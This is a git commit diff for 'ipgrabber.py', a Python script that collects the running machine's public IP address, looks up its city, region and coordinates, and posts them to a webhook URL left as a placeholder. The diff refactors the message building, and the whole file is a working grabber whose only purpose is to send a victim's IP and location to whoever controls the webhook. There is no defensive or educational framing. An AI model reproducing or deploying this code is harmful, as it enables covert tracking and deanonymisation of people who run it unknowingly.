5df589039e2fcc5ef6291dedf912c29f8bbf5b0c
TotoAJ <67079777+TotoAJ@users.noreply.github.com>
2021-06-22 02:43:40 -0700

    Update ipgrabber.py

--- ipgrabber.py
+++ ipgrabber.py
@@ -5,28 +5,19 @@ from urllib.request import *
 
 webhook_url = 'WEBHOOK URL HERE'
 ping = True
-geolocate = True
+if ping:
+	everyone = '@everyone\n'
+else:
+	everyone = ''
 
 response = requests.get('https://api.ipify.org/?format=json')
-dt = response.json()
-headers = {
-	'Content-Type': 'application/json',
-	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
-}
-ip = dt['ip']
+jsondata = response.json()
+
+ip = jsondata['ip']
 rsp = DbIpCity.get(ip, api_key='free')
 
-message = '@everyone\n' if ping else ''
-message += '```'
-message += '\nIP: ' + dt['ip'] + '\n'
-if geolocate:
-	message += 'City: ' + f'{rsp.city}\n'
-	message += 'Region: ' + f'{rsp.region}\n'
-	message += 'Country: ' + f'{rsp.country}\n'
-	message += 'Latitude: ' + f'{str(rsp.latitude)}\n'
-	message += 'Longitude: ' + f'{str(rsp.longitude)}\n'
-message += '```'
-payload = json.dumps({'content': message})
+data = {
+    "content": f"```{everyone}IP: {ip}\nCity: {rsp.city}\nRegion: {rsp.region}\nLatitude: {str(rsp.latitude)}\nLongitude: {str(rsp.longitude)}"
+}
 
-req = Request(webhook_url, data=payload.encode(), headers=headers)
-urlopen(req)
+requests.post(webhook_url, json=data)
